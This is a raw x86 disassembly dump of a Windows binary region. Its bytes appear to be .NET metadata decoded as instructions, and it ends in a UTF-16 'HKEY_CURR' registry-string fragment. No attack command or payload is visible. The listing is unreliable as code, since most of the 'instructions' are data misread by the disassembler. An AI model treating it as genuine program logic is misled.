  40c287:	0e                   	push   %cs
  40c288:	04 00                	add    $0x0,%al
  40c28a:	01 0e                	add    %ecx,(%esi)
  40c28c:	0e                   	push   %cs
  40c28d:	03 00                	add    (%eax),%eax
  40c28f:	00 01                	add    %al,(%ecx)
  40c291:	03 00                	add    (%eax),%eax
  40c293:	00 08                	add    %cl,(%eax)
  40c295:	1f                   	pop    %ds
  40c296:	07                   	pop    %es
  40c297:	12 15 12 45 02 0e    	adc    0xe024512,%dl
  40c29d:	0e                   	push   %cs
  40c29e:	1d 0e 08 0e 08       	sbb    $0x80e080e,%eax
  40c2a3:	02 02                	add    (%edx),%al
  40c2a5:	02 02                	add    (%edx),%al
  40c2a7:	02 02                	add    (%edx),%al
  40c2a9:	02 08                	add    (%eax),%cl
  40c2ab:	02 02                	add    (%edx),%al
  40c2ad:	08 02                	or     %al,(%edx)
  40c2af:	15 12 45 02 0e       	adc    $0xe024512,%eax
  40c2b4:	0e                   	push   %cs
  40c2b5:	04 20                	add    $0x20,%al
  40c2b7:	01 08                	add    %ecx,(%eax)
  40c2b9:	03 05 20 02 0e 08    	add    0x80e0220,%eax
  40c2bf:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c2c2:	01 0e                	add    %ecx,(%esi)
  40c2c4:	08 07                	or     %al,(%edi)
  40c2c6:	20 02                	and    %al,(%edx)
  40c2c8:	01 13                	add    %edx,(%ebx)
  40c2ca:	00 13                	add    %dl,(%ebx)
  40c2cc:	01 02                	add    %eax,(%edx)
  40c2ce:	06                   	push   %es
  40c2cf:	0e                   	push   %cs
  40c2d0:	04 00                	add    $0x0,%al
  40c2d2:	01 02                	add    %eax,(%edx)
  40c2d4:	0e                   	push   %cs
  40c2d5:	06                   	push   %es
  40c2d6:	00 02                	add    %al,(%edx)
  40c2d8:	02 0e                	add    (%esi),%cl
  40c2da:	10 08                	adc    %cl,(%eax)
  40c2dc:	08 07                	or     %al,(%edi)
  40c2de:	06                   	push   %es
  40c2df:	0e                   	push   %cs
  40c2e0:	02 02                	add    (%edx),%al
  40c2e2:	02 02                	add    (%edx),%al
  40c2e4:	02 04 00             	add    (%eax,%eax,1),%al
  40c2e7:	01 08                	add    %ecx,(%eax)
  40c2e9:	1c 06                	sbb    $0x6,%al
  40c2eb:	00 02                	add    %al,(%edx)
  40c2ed:	0e                   	push   %cs
  40c2ee:	0e                   	push   %cs
  40c2ef:	1d 1c 06 00 03       	sbb    $0x300061c,%eax
  40c2f4:	0e                   	push   %cs
  40c2f5:	0e                   	push   %cs
  40c2f6:	1c 1c                	sbb    $0x1c,%al
  40c2f8:	06                   	push   %es
  40c2f9:	00 03                	add    %al,(%ebx)
  40c2fb:	0e                   	push   %cs
  40c2fc:	0e                   	push   %cs
  40c2fd:	0e                   	push   %cs
  40c2fe:	0e                   	push   %cs
  40c2ff:	06                   	push   %es
  40c300:	00 03                	add    %al,(%ebx)
  40c302:	01 0e                	add    %ecx,(%esi)
  40c304:	0e                   	push   %cs
  40c305:	1c 02                	sbb    $0x2,%al
  40c307:	06                   	push   %es
  40c308:	18 05 07 02 02 12    	sbb    %al,0x12020207
  40c30e:	51                   	push   %ecx
  40c30f:	05 20 00 12 81       	add    $0x81120020,%eax
  40c314:	79 05                	jns    0x40c31b
  40c316:	00 02                	add    %al,(%edx)
  40c318:	0e                   	push   %cs
  40c319:	0e                   	push   %cs
  40c31a:	0e                   	push   %cs
  40c31b:	03 20                	add    (%eax),%esp
  40c31d:	00 02                	add    %al,(%edx)
  40c31f:	06                   	push   %es
  40c320:	20 01                	and    %al,(%ecx)
  40c322:	1d 0e 1d 03 07       	sbb    $0x7031d0e,%eax
  40c327:	15 12 80 cd 02       	adc    $0x2cd8012,%eax
  40c32c:	0e                   	push   %cs
  40c32d:	02 05 20 02 01 1c    	add    0x1c010220,%al
  40c333:	18 19                	sbb    %bl,(%ecx)
  40c335:	10 01                	adc    %al,(%ecx)
  40c337:	02 15 12 80 e9 01    	add    0x1e98012,%dl
  40c33d:	1e                   	push   %ds
  40c33e:	00 15 12 80 e9 01    	add    %dl,0x1e98012
  40c344:	1e                   	push   %ds
  40c345:	00 15 12 80 cd 02    	add    %dl,0x2cd8012
  40c34b:	1e                   	push   %ds
  40c34c:	00 02                	add    %al,(%edx)
  40c34e:	03 0a                	add    (%edx),%ecx
  40c350:	01 0e                	add    %ecx,(%esi)
  40c352:	0c 10                	or     $0x10,%al
  40c354:	01 01                	add    %eax,(%ecx)
  40c356:	1e                   	push   %ds
  40c357:	00 15 12 80 e9 01    	add    %dl,0x1e98012
  40c35d:	1e                   	push   %ds
  40c35e:	00 05 20 00 12 81    	add    %al,0x81120020
  40c364:	89 04 07             	mov    %eax,(%edi,%eax,1)
  40c367:	01 12                	add    %edx,(%edx)
  40c369:	38 04 00             	cmp    %al,(%eax,%eax,1)
  40c36c:	00 11                	add    %dl,(%ecx)
  40c36e:	79 07                	jns    0x40c377
  40c370:	30 01                	xor    %al,(%ecx)
  40c372:	01 01                	add    %eax,(%ecx)
  40c374:	10 1e                	adc    %bl,(%esi)
  40c376:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c379:	01 12                	add    %edx,(%edx)
  40c37b:	38 0e                	cmp    %cl,(%esi)
  40c37d:	07                   	pop    %es
  40c37e:	04 12                	add    $0x12,%al
  40c380:	80 99 12 80 9d 12 80 	sbbb   $0x80,0x129d8012(%ecx)
  40c387:	a1 11 80 a5 06       	mov    0x6a58011,%eax
  40c38c:	20 01                	and    %al,(%ecx)
  40c38e:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  40c393:	00 01                	add    %al,(%ecx)
  40c395:	0e                   	push   %cs
  40c396:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c39b:	08 08                	or     %cl,(%eax)
  40c39d:	08 05 00 00 11 80    	or     %al,0x80110000
  40c3a3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c3a4:	06                   	push   %es
  40c3a5:	20 03                	and    %al,(%ebx)
  40c3a7:	01 02                	add    %eax,(%edx)
  40c3a9:	02 02                	add    (%edx),%al
  40c3ab:	06                   	push   %es
  40c3ac:	20 01                	and    %al,(%ecx)
  40c3ae:	01 12                	add    %edx,(%edx)
  40c3b0:	81 95 04 20 01 01 02 	adcl   $0x3070e02,0x1012004(%ebp)
  40c3b7:	0e 07 03 
  40c3ba:	02 15 11 80 ad 01    	add    0x1ad8011,%dl
  40c3c0:	12 80 b1 12 80 b1    	adc    -0x4e7fed4f(%eax),%al
  40c3c6:	08 15 12 81 99 01    	or     %dl,0x1998112
  40c3cc:	12 80 bd 0b 20 01    	adc    0x1200bbd(%eax),%al
  40c3d2:	01 15 12 81 99 01    	add    %edx,0x1998112
  40c3d8:	12 80 bd 04 06 12    	adc    0x120604bd(%eax),%al
  40c3de:	80 d9 08             	sbb    $0x8,%cl
  40c3e1:	20 03                	and    %al,(%ebx)
  40c3e3:	01 12                	add    %edx,(%edx)
  40c3e5:	80 d9 08             	sbb    $0x8,%cl
  40c3e8:	02 08                	add    (%eax),%cl
  40c3ea:	15 12 81 99 01       	adc    $0x1998112,%eax
  40c3ef:	12 80 b9 0b 20 01    	adc    0x1200bb9(%eax),%al
  40c3f5:	01 15 12 81 99 01    	add    %edx,0x1998112
  40c3fb:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c401:	01 12                	add    %edx,(%edx)
  40c403:	4d                   	dec    %ebp
  40c404:	06                   	push   %es
  40c405:	20 01                	and    %al,(%ecx)
  40c407:	01 12                	add    %edx,(%edx)
  40c409:	80 b1 0a 20 00 15 12 	xorb   $0x12,0x1500200a(%ecx)
  40c410:	80 a9 01 12 80 b1 08 	subb   $0x8,-0x4e7fedff(%ecx)
  40c417:	15 12 80 a9 01       	adc    $0x1a98012,%eax
  40c41c:	12 80 b1 09 20 00    	adc    0x2009b1(%eax),%al
  40c422:	15 11 80 ad 01       	adc    $0x1ad8011,%eax
  40c427:	13 00                	adc    (%eax),%eax
  40c429:	08 15 11 80 ad 01    	or     %dl,0x1ad8011
  40c42f:	12 80 b1 04 20 00    	adc    0x2004b1(%eax),%al
  40c435:	13 00                	adc    (%eax),%eax
  40c437:	04 20                	add    $0x20,%al
  40c439:	00 12                	add    %dl,(%edx)
  40c43b:	59                   	pop    %ecx
  40c43c:	05 20 00 12 80       	add    $0x80120020,%eax
  40c441:	d9 03                	flds   (%ebx)
  40c443:	20 00                	and    %al,(%eax)
  40c445:	08 07                	or     %al,(%edi)
  40c447:	00 04 01             	add    %al,(%ecx,%eax,1)
  40c44a:	0e                   	push   %cs
  40c44b:	1c 1c                	sbb    $0x1c,%al
  40c44d:	1c 04                	sbb    $0x4,%al
  40c44f:	07                   	pop    %es
  40c450:	01 12                	add    %edx,(%edx)
  40c452:	44                   	inc    %esp
  40c453:	05 00 00 11 80       	add    $0x80110000,%eax
  40c458:	d5 04                	aad    $0x4
  40c45a:	0a 01                	or     (%ecx),%al
  40c45c:	12 44 05 20          	adc    0x20(%ebp,%eax,1),%al
  40c460:	00 12                	add    %dl,(%edx)
  40c462:	80 b5 04 07 01 12 48 	xorb   $0x48,0x12010704(%ebp)
  40c469:	04 0a                	add    $0xa,%al
  40c46b:	01 12                	add    %edx,(%edx)
  40c46d:	48                   	dec    %eax
  40c46e:	04 07                	add    $0x7,%al
  40c470:	01 12                	add    %edx,(%edx)
  40c472:	4c                   	dec    %esp
  40c473:	04 0a                	add    $0xa,%al
  40c475:	01 12                	add    %edx,(%edx)
  40c477:	4c                   	dec    %esp
  40c478:	04 07                	add    $0x7,%al
  40c47a:	01 12                	add    %edx,(%edx)
  40c47c:	50                   	push   %eax
  40c47d:	04 0a                	add    $0xa,%al
  40c47f:	01 12                	add    %edx,(%edx)
  40c481:	50                   	push   %eax
  40c482:	04 07                	add    $0x7,%al
  40c484:	01 12                	add    %edx,(%edx)
  40c486:	54                   	push   %esp
  40c487:	04 0a                	add    $0xa,%al
  40c489:	01 12                	add    %edx,(%edx)
  40c48b:	54                   	push   %esp
  40c48c:	04 07                	add    $0x7,%al
  40c48e:	01 12                	add    %edx,(%edx)
  40c490:	3c 04                	cmp    $0x4,%al
  40c492:	0a 01                	or     (%ecx),%al
  40c494:	12 3c 07             	adc    (%edi,%eax,1),%bh
  40c497:	07                   	pop    %es
  40c498:	02 11                	add    (%ecx),%dl
  40c49a:	80 f5 12             	xor    $0x12,%ch
  40c49d:	4d                   	dec    %ebp
  40c49e:	05 00 00 11 80       	add    $0x80110000,%eax
  40c4a3:	f5                   	cmc
  40c4a4:	06                   	push   %es
  40c4a5:	20 01                	and    %al,(%ecx)
  40c4a7:	11 80 f5 0d 05 07    	adc    %eax,0x7050df5(%eax)
  40c4ad:	01 12                	add    %edx,(%edx)
  40c4af:	80 fd 09             	cmp    $0x9,%ch
  40c4b2:	20 02                	and    %al,(%edx)
  40c4b4:	01 11                	add    %edx,(%ecx)
  40c4b6:	81 a1 11 81 a5 06 20 	andl   $0x11010120,0x6a58111(%ecx)
  40c4bd:	01 01 11 
  40c4c0:	81 a9 3d 07 16 12 81 	subl   $0x81120581,0x1216073d(%ecx)
  40c4c7:	05 12 81 
  40c4ca:	09 12                	or     %edx,(%edx)
  40c4cc:	81 0d 12 81 11 12 81 	orl    $0x81121581,0x12118112
  40c4d3:	15 12 81 
  40c4d6:	15 12 81 19 12       	adc    $0x12198112,%eax
  40c4db:	81 1d 12 81 21 12 81 	sbbl   $0x80122581,0x12218112
  40c4e2:	25 12 80 
  40c4e5:	f9                   	stc
  40c4e6:	12 81 29 12 81 2d    	adc    0x2d811229(%ecx),%al
  40c4ec:	12 81 31 12 81 35    	adc    0x35811231(%ecx),%al
  40c4f2:	12 4d 02             	adc    0x2(%ebp),%cl
  40c4f5:	1d 12 81 39 12       	sbb    $0x12398112,%eax
  40c4fa:	81 3d 02 02 12 4d 06 	cmpl   $0x1012006,0x4d120202
  40c501:	20 01 01 
  40c504:	12 81 ad 04 06 12    	adc    0x120604ad(%ecx),%al
  40c50a:	81 11 06 00 01 12    	adcl   $0x12010006,(%ecx)
  40c510:	81 11 0a 0e 00 03    	adcl   $0x3000e0a,(%ecx)
  40c516:	12 81 11 12 81 11    	adc    0x11811211(%ecx),%al
  40c51c:	12 81 11 12 81 09    	adc    0x9811211(%ecx),%al
  40c522:	06                   	push   %es
  40c523:	20 01                	and    %al,(%ecx)
  40c525:	01 12                	add    %edx,(%edx)
  40c527:	81 11 06 20 01 01    	adcl   $0x1012006,(%ecx)
  40c52d:	12 81 15 06 20 01    	adc    0x1200615(%ecx),%al
  40c533:	01 11                	add    %edx,(%ecx)
  40c535:	80 f5 05             	xor    $0x5,%ch
  40c538:	20 02                	and    %al,(%edx)
  40c53a:	01 08                	add    %ecx,(%eax)
  40c53c:	0e                   	push   %cs
  40c53d:	07                   	pop    %es
  40c53e:	20 01                	and    %al,(%ecx)
  40c540:	01 1d 12 81 39 04    	add    %ebx,0x4398112
  40c546:	06                   	push   %es
  40c547:	12 81 bd 08 20 03    	adc    0x32008bd(%ecx),%al
  40c54d:	01 0e                	add    %ecx,(%esi)
  40c54f:	02 12                	add    (%edx),%dl
  40c551:	81 39 07 20 02 01    	cmpl   $0x1022007,(%ecx)
  40c557:	12 81 09 08 06 20    	adc    0x20060809(%ecx),%al
  40c55d:	01 01                	add    %eax,(%ecx)
  40c55f:	12 81 19 05 20 00    	adc    0x200519(%ecx),%al
  40c565:	12 81 21 05 20 00    	adc    0x200521(%ecx),%al
  40c56b:	12 81 01 06 20 01    	adc    0x1200601(%ecx),%al
  40c571:	01 12                	add    %edx,(%edx)
  40c573:	81 01 04 06 12 81    	addl   $0x81120604,(%ecx)
  40c579:	c1 07 20             	roll   $0x20,(%edi)
  40c57c:	01 01                	add    %eax,(%ecx)
  40c57e:	1d 12 81 c1 0a       	sbb    $0xac18112,%eax
  40c583:	20 03                	and    %al,(%ebx)
  40c585:	01 0e                	add    %ecx,(%esi)
  40c587:	12 81 01 12 81 09    	adc    0x9811201(%ecx),%al
  40c58d:	08 20                	or     %ah,(%eax)
  40c58f:	01 12                	add    %edx,(%edx)
  40c591:	80 f9 12             	cmp    $0x12,%cl
  40c594:	81 cd 08 00 01 12    	or     $0x12010008,%ebp
  40c59a:	81 29 12 81 01 05    	subl   $0x5018112,(%ecx)
  40c5a0:	20 00                	and    %al,(%eax)
  40c5a2:	12 81 d5 04 20 00    	adc    0x2004d5(%ecx),%al
  40c5a8:	1d 05 07 00 01       	sbb    $0x1000705,%eax
  40c5ad:	12 81 d5 1d 05 06    	adc    0x6051dd5(%ecx),%al
  40c5b3:	00 01                	add    %al,(%ecx)
  40c5b5:	12 81 31 1c 05 20    	adc    0x20051c31(%ecx),%al
  40c5bb:	00 12                	add    %dl,(%edx)
  40c5bd:	81 11 1b 20 08 01    	adcl   $0x108201b,(%ecx)
  40c5c3:	12 81 11 12 81 11    	adc    0x11811211(%ecx),%al
  40c5c9:	12 81 11 12 81 11    	adc    0x11811211(%ecx),%al
  40c5cf:	12 81 11 12 81 11    	adc    0x11811211(%ecx),%al
  40c5d5:	12 81 11 12 81 11    	adc    0x11811211(%ecx),%al
  40c5db:	0d 07 04 12 81       	or     $0x81120407,%eax
  40c5e0:	41                   	inc    %ecx
  40c5e1:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c5e7:	12 4d 06             	adc    0x6(%ebp),%cl
  40c5ea:	20 01                	and    %al,(%ecx)
  40c5ec:	01 12                	add    %edx,(%edx)
  40c5ee:	80 f9 05             	cmp    $0x5,%cl
  40c5f1:	20 00                	and    %al,(%eax)
  40c5f3:	12 81 15 07 20 02    	adc    0x2200715(%ecx),%al
  40c5f9:	01 0e                	add    %ecx,(%esi)
  40c5fb:	12 81 45 0b 20 03    	adc    0x3200b45(%ecx),%al
  40c601:	01 0e                	add    %ecx,(%esi)
  40c603:	12 81 dd 1d 12 81    	adc    -0x7eede223(%ecx),%al
  40c609:	45                   	inc    %ebp
  40c60a:	04 20                	add    $0x20,%al
  40c60c:	00 1d 03 0b 20 03    	add    %bl,0x3200b03
  40c612:	01 12                	add    %edx,(%edx)
  40c614:	80 e1 1d             	and    $0x1d,%cl
  40c617:	03 12                	add    (%edx),%edx
  40c619:	81 09 09 20 03 01    	orl    $0x1032009,(%ecx)
  40c61f:	1d 05 0e 11 81       	sbb    $0x81110e05,%eax
  40c624:	e1 10                	loope  0x40c636
  40c626:	07                   	pop    %es
  40c627:	06                   	push   %es
  40c628:	08 15 11 69 01 12    	or     %dl,0x12016911
  40c62e:	6d                   	insl   (%dx),%es:(%edi)
  40c62f:	12 38                	adc    (%eax),%bh
  40c631:	11 71 02             	adc    %esi,0x2(%ecx)
  40c634:	12 75 09             	adc    0x9(%ebp),%dh
  40c637:	20 00                	and    %al,(%eax)
  40c639:	15 12 81 e5 01       	adc    $0x1e58112,%eax
  40c63e:	12 6d 07             	adc    0x7(%ebp),%ch
  40c641:	15 12 81 e5 01       	adc    $0x1e58112,%eax
  40c646:	12 6d 08             	adc    0x8(%ebp),%ch
  40c649:	20 00                	and    %al,(%eax)
  40c64b:	15 11 69 01 13       	adc    $0x13016911,%eax
  40c650:	00 06                	add    %al,(%esi)
  40c652:	15 11 69 01 12       	adc    $0x12016911,%eax
  40c657:	6d                   	insl   (%dx),%es:(%edi)
  40c658:	0a 30                	or     (%eax),%dh
  40c65a:	02 02                	add    (%edx),%al
  40c65c:	01 10                	add    %edx,(%eax)
  40c65e:	1e                   	push   %ds
  40c65f:	00 10                	add    %dl,(%eax)
  40c661:	1e                   	push   %ds
  40c662:	01 0a                	add    %ecx,(%edx)
  40c664:	0a 02                	or     (%edx),%al
  40c666:	15 11 69 01 12       	adc    $0x12016911,%eax
  40c66b:	6d                   	insl   (%dx),%es:(%edi)
  40c66c:	12 38                	adc    (%eax),%bh
  40c66e:	04 20                	add    $0x20,%al
  40c670:	00 12                	add    %dl,(%edx)
  40c672:	7d 05                	jge    0x40c679
  40c674:	20 00                	and    %al,(%eax)
  40c676:	12 80 81 05 00 00    	adc    0x581(%eax),%al
  40c67c:	12 81 e9 06 20 01    	adc    0x12006e9(%ecx),%al
  40c682:	01 12                	add    %edx,(%edx)
  40c684:	81 e9 04 20 01 01    	sub    $0x1012004,%ecx
  40c68a:	0a 05 20 00 12 80    	or     0x80120020,%al
  40c690:	e1 09                	loope  0x40c69b
  40c692:	20 03                	and    %al,(%ebx)
  40c694:	12 80 b5 1d 05 08    	adc    0x8051db5(%eax),%al
  40c69a:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c69d:	00 11                	add    %dl,(%ecx)
  40c69f:	71 06                	jno    0x40c6a7
  40c6a1:	0a 02                	or     (%edx),%al
  40c6a3:	11 71 12             	adc    %esi,0x12(%ecx)
  40c6a6:	38 05 20 01 01 12    	cmp    %al,0x12010120
  40c6ac:	75 0c                	jne    0x40c6ba
  40c6ae:	07                   	pop    %es
  40c6af:	06                   	push   %es
  40c6b0:	08 02                	or     %al,(%edx)
  40c6b2:	11 71 12             	adc    %esi,0x12(%ecx)
  40c6b5:	3c 11                	cmp    $0x11,%al
  40c6b7:	71 12                	jno    0x40c6cb
  40c6b9:	75 04                	jne    0x40c6bf
  40c6bb:	20 00                	and    %al,(%eax)
  40c6bd:	12 75 08             	adc    0x8(%ebp),%dh
  40c6c0:	15 11 80 c1 01       	adc    $0x1c18011,%eax
  40c6c5:	11 80 c5 05 20 01    	adc    %eax,0x12005c5(%eax)
  40c6cb:	01 13                	add    %edx,(%ebx)
  40c6cd:	00 06                	add    %al,(%esi)
  40c6cf:	0a 02                	or     (%edx),%al
  40c6d1:	11 71 12             	adc    %esi,0x12(%ecx)
  40c6d4:	3c 05                	cmp    $0x5,%al
  40c6d6:	20 00                	and    %al,(%eax)
  40c6d8:	12 81 ed 13 07 07    	adc    0x70713ed(%ecx),%al
  40c6de:	08 11                	or     %dl,(%ecx)
  40c6e0:	71 15                	jno    0x40c6f7
  40c6e2:	11 80 c1 01 11 80    	adc    %eax,-0x7feefe3f(%eax)
  40c6e8:	c5 12                	lds    (%edx),%edx
  40c6ea:	44                   	inc    %esp
  40c6eb:	02 02                	add    (%edx),%al
  40c6ed:	12 75 05             	adc    0x5(%ebp),%dh
  40c6f0:	20 00                	and    %al,(%eax)
  40c6f2:	12 81 f5 05 20 00    	adc    0x2005f5(%ecx),%al
  40c6f8:	12 81 f9 04 20 00    	adc    0x2004f9(%ecx),%al
  40c6fe:	12 49 06             	adc    0x6(%ecx),%cl
  40c701:	0a 02                	or     (%edx),%al
  40c703:	11 71 12             	adc    %esi,0x12(%ecx)
  40c706:	44                   	inc    %esp
  40c707:	05 20 00 12 81       	add    $0x81120020,%eax
  40c70c:	fd                   	std
  40c70d:	04 20                	add    $0x20,%al
  40c70f:	01 02                	add    %eax,(%edx)
  40c711:	1c 07                	sbb    $0x7,%al
  40c713:	20 02                	and    %al,(%edx)
  40c715:	01 12                	add    %edx,(%edx)
  40c717:	80 d9 08             	sbb    $0x8,%cl
  40c71a:	06                   	push   %es
  40c71b:	20 01                	and    %al,(%ecx)
  40c71d:	01 12                	add    %edx,(%edx)
  40c71f:	81 fd 04 20 01 02    	cmp    $0x2012004,%ebp
  40c725:	0e                   	push   %cs
  40c726:	34 07                	xor    $0x7,%al
  40c728:	18 08                	sbb    %cl,(%eax)
  40c72a:	02 11                	add    (%ecx),%dl
  40c72c:	71 08                	jno    0x40c736
  40c72e:	15 11 80 c1 01       	adc    $0x1c18011,%eax
  40c733:	11 80 c5 12 48 11    	adc    %eax,0x114812c5(%eax)
  40c739:	71 02                	jno    0x40c73d
  40c73b:	02 15 11 69 01 0e    	add    0xe016911,%dl
  40c741:	11 80 dd 02 11 71    	adc    %eax,0x711102dd(%eax)
  40c747:	02 11                	add    (%ecx),%dl
  40c749:	71 11                	jno    0x40c75c
  40c74b:	71 11                	jno    0x40c75e
  40c74d:	71 11                	jno    0x40c760
  40c74f:	71 11                	jno    0x40c762
  40c751:	71 11                	jno    0x40c764
  40c753:	71 02                	jno    0x40c757
  40c755:	11 71 11             	adc    %esi,0x11(%ecx)
  40c758:	71 12                	jno    0x40c76c
  40c75a:	75 06                	jne    0x40c762
  40c75c:	0a 02                	or     (%edx),%al
  40c75e:	11 71 12             	adc    %esi,0x12(%ecx)
  40c761:	48                   	dec    %eax
  40c762:	0b 20                	or     (%eax),%esp
  40c764:	01 15 12 81 e5 01    	add    %edx,0x1e58112
  40c76a:	0e                   	push   %cs
  40c76b:	11 80 dd 06 15 12    	adc    %eax,0x121506dd(%eax)
  40c771:	81 e5 01 0e 05 15    	and    $0x15050e01,%ebp
  40c777:	11 69 01             	adc    %ebp,0x1(%ecx)
  40c77a:	0e                   	push   %cs
  40c77b:	09 0a                	or     %ecx,(%edx)
  40c77d:	02 15 11 69 01 0e    	add    0xe016911,%dl
  40c783:	12 48 0e             	adc    0xe(%eax),%cl
  40c786:	20 03                	and    %al,(%ebx)
  40c788:	01 1d 05 15 12 45    	add    %ebx,0x45121505
  40c78e:	02 0e                	add    (%esi),%cl
  40c790:	12 80 f1 02 31 07    	adc    0x73102f1(%eax),%al
  40c796:	17                   	pop    %ss
  40c797:	08 11                	or     %dl,(%ecx)
  40c799:	71 08                	jno    0x40c7a3
  40c79b:	15 11 80 c1 01       	adc    $0x1c18011,%eax
  40c7a0:	11 80 c5 12 4c 02    	adc    %eax,0x24c12c5(%eax)
  40c7a6:	15 11 69 01 1d       	adc    $0x1d016911,%eax
  40c7ab:	05 11 80 dd 02       	add    $0x2dd8011,%eax
  40c7b0:	02 02                	add    (%edx),%al
  40c7b2:	11 71 11             	adc    %esi,0x11(%ecx)
  40c7b5:	71 11                	jno    0x40c7c8
  40c7b7:	71 11                	jno    0x40c7ca
  40c7b9:	71 11                	jno    0x40c7cc
  40c7bb:	71 11                	jno    0x40c7ce
  40c7bd:	71 02                	jno    0x40c7c1
  40c7bf:	02 02                	add    (%edx),%al
  40c7c1:	02 11                	add    (%ecx),%dl
  40c7c3:	71 12                	jno    0x40c7d7
  40c7c5:	75 06                	jne    0x40c7cd
  40c7c7:	0a 02                	or     (%edx),%al
  40c7c9:	11 71 12             	adc    %esi,0x12(%ecx)
  40c7cc:	4c                   	dec    %esp
  40c7cd:	0c 20                	or     $0x20,%al
  40c7cf:	01 15 12 81 e5 01    	add    %edx,0x1e58112
  40c7d5:	1d 05 11 80 dd       	sbb    $0xdd801105,%eax
  40c7da:	07                   	pop    %es
  40c7db:	15 12 81 e5 01       	adc    $0x1e58112,%eax
  40c7e0:	1d 05 06 15 11       	sbb    $0x11150605,%eax
  40c7e5:	69 01 1d 05 0a 0a    	imul   $0xa0a051d,(%ecx),%eax
  40c7eb:	02 15 11 69 01 1d    	add    0x1d016911,%dl
  40c7f1:	05 12 4c 05 20       	add    $0x20054c12,%eax
  40c7f6:	01 01                	add    %eax,(%ecx)
  40c7f8:	1d 05 08 00 01       	sbb    $0x1000805,%eax
  40c7fd:	12 80 e5 12 80 e1    	adc    -0x1e7fed1b(%eax),%al
  40c803:	0a 20                	or     (%eax),%ah
  40c805:	00 15 12 80 e9 01    	add    %dl,0x1e98012
  40c80b:	12 80 d1 09 15 12    	adc    0x121509d1(%eax),%al
  40c811:	80 cd 02             	or     $0x2,%ch
  40c814:	12 80 d1 02 05 0a    	adc    0xa0502d1(%eax),%al
  40c81a:	01 12                	add    %edx,(%edx)
  40c81c:	80 d1 0b             	adc    $0xb,%cl
  40c81f:	10 01                	adc    %al,(%ecx)
  40c821:	01 08                	add    %ecx,(%eax)
  40c823:	15 12 80 e9 01       	adc    $0x1e98012,%eax
  40c828:	1e                   	push   %ds
  40c829:	00 05 20 00 12 82    	add    %al,0x82120020
  40c82f:	09 05 20 00 12 80    	or     %eax,0x80120020
  40c835:	ed                   	in     (%dx),%eax
  40c836:	09 00                	or     %eax,(%eax)
  40c838:	02 12                	add    (%edx),%dl
  40c83a:	81 ed 12 80 ed 0e    	sub    $0xeed8012,%ebp
  40c840:	0d 20 01 15 12       	or     $0x12150120,%eax
  40c845:	80 e9 01             	sub    $0x1,%cl
  40c848:	12 80 d1 12 81 ed    	adc    -0x127eed2f(%eax),%al
  40c84e:	0b 10                	or     (%eax),%edx
  40c850:	01 01                	add    %eax,(%ecx)
  40c852:	01 15 12 80 e9 01    	add    %edx,0x1e98012
  40c858:	1e                   	push   %ds
  40c859:	00 06                	add    %al,(%esi)
  40c85b:	00 01                	add    %al,(%ecx)
  40c85d:	12 80 d1 0e 04 20    	adc    0x20040ed1(%eax),%al
  40c863:	01 01                	add    %eax,(%ecx)
  40c865:	1c 06                	sbb    $0x6,%al
  40c867:	20 01                	and    %al,(%ecx)
  40c869:	0e                   	push   %cs
  40c86a:	11 82 15 05 20 02    	adc    %eax,0x2200515(%edx)
  40c870:	0e                   	push   %cs
  40c871:	0e                   	push   %cs
  40c872:	0e                   	push   %cs
  40c873:	05 20 00 12 82       	add    $0x82120020,%eax
  40c878:	19 0b                	sbb    %ecx,(%ebx)
  40c87a:	20 01                	and    %al,(%ecx)
  40c87c:	15 12 80 a9 01       	adc    $0x1a98012,%eax
  40c881:	12 80 f1 0e 08 15    	adc    0x15080ef1(%eax),%al
  40c887:	12 80 a9 01 12 80    	adc    -0x7fedfe57(%eax),%al
  40c88d:	f1                   	int1
  40c88e:	05 20 01 13 00       	add    $0x130120,%eax
  40c893:	08 0a                	or     %cl,(%edx)
  40c895:	07                   	pop    %es
  40c896:	05 08 02 11 71       	add    $0x71110208,%eax
  40c89b:	12 50 12             	adc    0x12(%eax),%dl
  40c89e:	75 06                	jne    0x40c8a6
  40c8a0:	0a 02                	or     (%edx),%al
  40c8a2:	11 71 12             	adc    %esi,0x12(%ecx)
  40c8a5:	50                   	push   %eax
  40c8a6:	0a 07                	or     (%edi),%al
  40c8a8:	05 08 11 71 12       	add    $0x12711108,%eax
  40c8ad:	54                   	push   %esp
  40c8ae:	02 12                	add    (%edx),%dl
  40c8b0:	75 06                	jne    0x40c8b8
  40c8b2:	0a 02                	or     (%edx),%al
  40c8b4:	11 71 12             	adc    %esi,0x12(%ecx)
  40c8b7:	54                   	push   %esp
  40c8b8:	05 00 00 11 80       	add    $0x80110000,%eax
  40c8bd:	c5 06                	lds    (%esi),%eax
  40c8bf:	00 01                	add    %al,(%ecx)
  40c8c1:	01 11                	add    %edx,(%ecx)
  40c8c3:	80 c5 08             	add    $0x8,%ch
  40c8c6:	b7 7a                	mov    $0x7a,%bh
  40c8c8:	5c                   	pop    %esp
  40c8c9:	56                   	push   %esi
  40c8ca:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c8cd:	89 08                	mov    %ecx,(%eax)
  40c8cf:	8e 41 e1             	mov    -0x1f(%ecx),%es
  40c8d2:	f1                   	int1
  40c8d3:	c7                   	(bad)
  40c8d4:	90                   	nop
  40c8d5:	d7                   	xlat   %ds:(%ebx)
  40c8d6:	cf                   	iret
  40c8d7:	08 0e                	or     %cl,(%esi)
  40c8d9:	99                   	cltd
  40c8da:	37                   	aaa
  40c8db:	5e                   	pop    %esi
  40c8dc:	54                   	push   %esp
  40c8dd:	76 99                	jbe    0x40c878
  40c8df:	42                   	inc    %edx
  40c8e0:	04 27                	add    $0x27,%al
  40c8e2:	00 00                	add    %al,(%eax)
  40c8e4:	00 04 25 00 00 00 80 	add    %al,-0x80000000(,%eiz,1)
  40c8eb:	9a 48 00 4b 00 45 00 	lcall  $0x45,$0x4b0048
  40c8f2:	59                   	pop    %ecx
  40c8f3:	00 5f 00             	add    %bl,0x0(%edi)
  40c8f6:	43                   	inc    %ebx
  40c8f7:	00 55 00             	add    %dl,0x0(%ebp)
  40c8fa:	52                   	push   %edx
  40c8fb:	00 52 00             	add    %dl,0x0(%edx)
